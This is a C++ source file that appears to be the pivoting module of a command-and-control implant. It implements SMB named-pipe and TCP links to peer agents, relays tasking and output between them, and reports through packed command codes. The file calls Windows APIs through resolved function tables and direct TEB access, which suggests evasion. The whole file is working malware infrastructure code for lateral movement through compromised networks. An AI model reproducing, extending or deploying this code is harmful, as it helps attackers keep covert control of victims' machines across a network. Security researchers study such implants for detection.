#include "Pivotter.h"
#include <new>

Pivotter* Pivotter_Create()
{
	Pivotter* self = (Pivotter*)MemAllocLocal(sizeof(Pivotter));
	new (&self->pivots) Vector<PivotData>();
	return self;
}

void Pivotter_LinkPivotSMB(Pivotter* self, ULONG taskId, ULONG commandId, CHAR* pipename, Packer* outPacker)
{
	HANDLE hPipe;
	DWORD startTickCount = ApiWin->GetTickCount() + 5000;
	while (1) {
		hPipe = ApiWin->CreateFileA(pipename, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_FLAG_OPEN_NO_RECALL, NULL);
		if (INVALID_HANDLE_VALUE != hPipe)
			break;

		if (ApiWin->GetLastError() == ERROR_PIPE_BUSY)
			ApiWin->WaitNamedPipeA(pipename, 2000);
		else
			ApiWin->Sleep(1000);

		if (ApiWin->GetTickCount() >= startTickCount) {
			Packer_Pack32(outPacker, taskId);
			Packer_Pack32(outPacker, 0x1111ffff);			// COMMAND_ERROR
			Packer_Pack32(outPacker, TEB->LastErrorValue);
			return;
		}
	}

	DWORD dwMode = PIPE_READMODE_MESSAGE;
	if (ApiWin->SetNamedPipeHandleState(hPipe, &dwMode, NULL, NULL)) {
		
		if (PeekNamedPipeTime(hPipe, 5000)) {
			LPVOID buffer      = NULL;
			ULONG  bufferSize  = 0;
			DWORD  readedBytes = ReadDataFromPipe(hPipe, &buffer, &bufferSize);

			if (readedBytes > 4 && buffer) {
				PivotData pivotData = { 0 };
				pivotData.Id = taskId;
				pivotData.Channel = hPipe;
				pivotData.Type = PIVOT_TYPE_SMB;

				self->pivots.push_back(pivotData);

				Packer_Pack32(outPacker, taskId);
				Packer_Pack32(outPacker, commandId);
				Packer_Pack8(outPacker, pivotData.Type);
				Packer_Pack32(outPacker, *((ULONG*)buffer));
				Packer_PackBytes(outPacker, (PBYTE)buffer + 4, readedBytes - 4);

				MemFreeLocal(&buffer, bufferSize);

				return;
			}
			else {
				if (buffer && bufferSize)
					MemFreeLocal(&buffer, bufferSize);
			}
		}
	}

	ApiWin->DisconnectNamedPipe(hPipe);
	ApiNt->NtClose(hPipe);

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, 0x1111ffff);			// COMMAND_ERROR
	Packer_Pack32(outPacker, TEB->LastErrorValue);
}

BOOL CheckSocketState(SOCKET sock, int timeoutMs)
{
	ULONG endTime = ApiWin->GetTickCount() + timeoutMs;
	while (ApiWin->GetTickCount() < endTime) {

		fd_set readfds;
		readfds.fd_count = 1;
		readfds.fd_array[0] = sock;
		timeval timeout = { 0, 100 };
		
		int selResult = ApiWin->select(0, &readfds, NULL, NULL, &timeout);
		if (selResult == 0)
			return TRUE;

		if (selResult == SOCKET_ERROR)
			return FALSE;

		char buf;
		int recvResult = ApiWin->recv(sock, &buf, 1, MSG_PEEK);
		if (recvResult == 0)
			return FALSE;

		if (recvResult < 0) {
			int err = ApiWin->WSAGetLastError();
			if (err == WSAEWOULDBLOCK)
				return TRUE;
		}
		else return TRUE;
	}
	return FALSE;
}

void Pivotter_LinkPivotTCP(Pivotter* self, ULONG taskId, ULONG commandId, CHAR* address, WORD port, Packer* outPacker)
{
	ULONG err = 0;
	WSAData wsaData;
	if (ApiWin->WSAStartup(514, &wsaData)) {
		err = ApiWin->WSAGetLastError();
		ApiWin->WSACleanup();
	}
	else {
		SOCKET sock = ApiWin->socket(AF_INET, SOCK_STREAM, 0);
		if (sock != -1) {
			hostent* host = ApiWin->gethostbyname(address);
			if (host) {
				sockaddr_in socketAddress;
				memcpy(&socketAddress.sin_addr, *(const void**)host->h_addr_list, host->h_length); 				//memmove
				socketAddress.sin_family = AF_INET;
				socketAddress.sin_port = _htons(port);
				u_long mode = 0;
				if (ApiWin->ioctlsocket(sock, FIONBIO, &mode) != -1) {
					if (!(ApiWin->connect(sock, (sockaddr*)&socketAddress, 16) == -1 && ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)) {
							
						if (PeekSocketTime(sock, 5000)) {
							LPVOID buffer      = NULL;
							ULONG  bufferSize  = 0;
							DWORD  readedBytes = ReadDataFromSocket(sock, &buffer, &bufferSize);

							if (readedBytes > 4 && buffer) {
								PivotData pivotData = { 0 };
								pivotData.Id     = taskId;
								pivotData.Socket = sock;
								pivotData.Type   = PIVOT_TYPE_TCP;

								self->pivots.push_back(pivotData);

								Packer_Pack32(outPacker, taskId);
								Packer_Pack32(outPacker, commandId);
								Packer_Pack8(outPacker, pivotData.Type);
								Packer_Pack32(outPacker, *((ULONG*)buffer));
								Packer_PackBytes(outPacker, (BYTE*)buffer + 4, readedBytes - 4);

								MemFreeLocal((LPVOID*)&buffer, bufferSize);
								return;
							}
							else {
								if (buffer && bufferSize)
									MemFreeLocal((LPVOID*)&buffer, bufferSize);
								err = ApiWin->WSAGetLastError();
							}
						}
						else err = ERROR_CONNECTION_REFUSED;
					}
					else err = ApiWin->WSAGetLastError();
					ApiWin->closesocket(sock);
				}
				else err = ApiWin->WSAGetLastError();
			}
			else err = ERROR_BAD_NET_NAME;
		}
		else err = ApiWin->WSAGetLastError();
	}
	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, 0x1111ffff);			// COMMAND_ERROR
	Packer_Pack32(outPacker, err);
}


void Pivotter_UnlinkPivot(Pivotter* self, ULONG taskId, ULONG commandId, ULONG pivotId, Packer* outPacker)
{
	ULONG result = FALSE;
	PivotData* pivotData = NULL;
	for (int i = 0; i < self->pivots.size(); i++) {
		pivotData = &(self->pivots[i]);
		if (pivotData->Id == pivotId) {
			if (pivotData->Type == PIVOT_TYPE_SMB) {
				if (pivotData->Channel) {
					ApiWin->DisconnectNamedPipe(pivotData->Channel);
					ApiNt->NtClose(pivotData->Channel);
				}
			}
			else if (pivotData->Type == PIVOT_TYPE_TCP) {
				ApiWin->shutdown(pivotData->Socket, 2);
				ApiWin->closesocket(pivotData->Socket);
			}
			result = pivotData->Type;
			self->pivots.remove(i);
			break;
		}
	}
	pivotData = NULL;

	Packer_Pack32(outPacker, taskId);
	Packer_Pack32(outPacker, commandId);
	Packer_Pack32(outPacker, pivotId);
	Packer_Pack8(outPacker, result);
}

void Pivotter_WritePivot(Pivotter* self, ULONG pivotId, BYTE* data, ULONG size)
{
	if (data == NULL || size == 0)
		return;

	PivotData* pivotData = NULL;
	for (int i = 0; i < self->pivots.size(); i++) {
		pivotData = &(self->pivots[i]);
		if (pivotData->Id == pivotId) {
			if (pivotData->Type == PIVOT_TYPE_SMB) {
				if (pivotData->Channel)
					WriteDataToPipe(pivotData->Channel, data, size);
			}
			else if (pivotData->Type == PIVOT_TYPE_TCP) {
				timeval timeout = { 0, 100 };
				fd_set  exceptfds;
				fd_set  writefds;

				writefds.fd_array[0] = pivotData->Socket;
				writefds.fd_count = 1;
				exceptfds.fd_array[0] = writefds.fd_array[0];
				exceptfds.fd_count = 1;
				ApiWin->select(0, 0, &writefds, &exceptfds, &timeout);
				if (ApiWin->__WSAFDIsSet(pivotData->Socket, &exceptfds))
					break;
				if (ApiWin->__WSAFDIsSet(pivotData->Socket, &writefds)) {
					if (ApiWin->send(pivotData->Socket, (const char*)&size, 4, 0) != -1 || ApiWin->WSAGetLastError() != WSAEWOULDBLOCK)
						ApiWin->send(pivotData->Socket, (const char*)data, size, 0);
				}
			}
			break;
		}
	}
	pivotData = NULL;
}

void Pivotter_ProcessPivots(Pivotter* self, Packer* packer)
{
	if ( !self->pivots.size() )
		return;

	PivotData* pivotData = NULL;
	for (int i = 0; i < self->pivots.size(); i++) {
		pivotData = &self->pivots[i];

		if (pivotData->Type == PIVOT_TYPE_SMB) {

			if (pivotData->Channel) {
				if (PeekNamedPipeTime(pivotData->Channel, 0)) {
					LPVOID mallocBuffer = NULL;
					ULONG  mallocSize   = 0;
					DWORD  readedBytes  = ReadDataFromPipe(pivotData->Channel, &mallocBuffer, &mallocSize);
					if (readedBytes != -1) {
						Packer_Pack32(packer, 0);
						Packer_Pack32(packer, COMMAND_PIVOT_EXEC);
						Packer_Pack32(packer, pivotData->Id);
						Packer_PackBytes(packer, (PBYTE)mallocBuffer, readedBytes);
					}
					if(mallocBuffer && mallocSize)
						MemFreeLocal(&mallocBuffer, readedBytes);
				}
				else {
					if (TEB->LastErrorValue == ERROR_BROKEN_PIPE) {
						TEB->LastErrorValue = 0;

						ApiWin->DisconnectNamedPipe(pivotData->Channel);
						ApiNt->NtClose(pivotData->Channel);

						Packer_Pack32(packer, 0);
						Packer_Pack32(packer, COMMAND_UNLINK);
						Packer_Pack32(packer, pivotData->Id);
						Packer_Pack8(packer, PIVOT_TYPE_DISCONNECT);

						self->pivots.remove(i);
						i--;
					}
				}
			}
		}
		else if (pivotData->Type == PIVOT_TYPE_TCP) {

			if ( CheckSocketState(pivotData->Socket, 2500) ) {
				LPVOID buffer = NULL;
				ULONG  dataLength = 0;
				ULONG  readed = 0;
				DWORD res = ApiWin->ioctlsocket(pivotData->Socket, FIONREAD, &dataLength);
				if (res != -1 && dataLength >= 4) {
					dataLength = 0;
					readed = ReadFromSocket(pivotData->Socket, (PCHAR)&dataLength, 4);
					if (readed == 4 && dataLength) {
						buffer = MemAllocLocal(dataLength);
						readed = ReadFromSocket(pivotData->Socket, (PCHAR)buffer, dataLength);
						if (readed != -1) {
							Packer_Pack32(packer, 0);
							Packer_Pack32(packer, COMMAND_PIVOT_EXEC);
							Packer_Pack32(packer, pivotData->Id);
							Packer_PackBytes(packer, (BYTE*)buffer, readed);
						}
						if (buffer && dataLength)
							MemFreeLocal((LPVOID*)&buffer, dataLength);
					}
				}
			}
			else {
				ApiWin->shutdown(pivotData->Socket, 2);
				ApiWin->closesocket(pivotData->Socket);

				Packer_Pack32(packer, 0);
				Packer_Pack32(packer, COMMAND_UNLINK);
				Packer_Pack32(packer, pivotData->Id);
				Packer_Pack8(packer, PIVOT_TYPE_DISCONNECT);

				self->pivots.remove(i);
				i--;
			}
		}
	}
	pivotData = NULL;
}